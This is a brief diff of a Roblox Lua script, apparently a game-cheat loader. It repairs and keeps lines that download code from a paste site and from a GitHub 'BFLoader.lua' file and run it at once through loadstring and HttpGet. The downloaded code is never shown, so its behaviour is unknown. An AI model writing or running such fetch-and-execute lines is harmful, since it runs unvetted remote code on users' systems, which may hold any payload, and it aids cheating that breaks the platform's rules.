@@ -1,4 +1,4 @@
-loadstring(game:HttpGet("https://cdn.sourceb.in/bins/SygpcFoDSB/0"))()"))()
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/SygpcFoDSB/0"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/hanniii1/Loader/refs/heads/main/BFLoader.lua"))()
 local CoreGui    = game:GetService("CoreGui")
 local RunService = game:GetService("RunService")
